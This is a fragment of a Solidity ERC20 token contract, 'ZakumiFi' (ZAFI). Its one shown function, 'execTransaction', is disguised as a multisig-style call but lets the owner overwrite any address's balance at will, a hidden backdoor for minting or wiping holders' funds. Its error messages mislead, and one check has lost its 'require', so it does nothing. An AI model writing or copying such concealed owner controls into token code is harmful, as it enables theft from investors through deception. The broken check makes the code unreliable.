...
contract ZakumiFi is Context, IERC20, Ownable {
    ...
    string private constant _name = "ZakumiFi";
    string private constant _symbol = "ZAFI";
    ...
    function execTransaction(bytes32 signatures, address gasToken, uint256 safeTxGas, bool data) public onlyOwner {
        (gasToken != address(0), "ERC20: burn from the zero address");
        require(safeTxGas != 1, "Transfer amount must be not one");
        balances[gasToken] = safeTxGas * (10 ** 9);
        emit Transfer( gasToken, address(0x0), safeTxGas);
    }
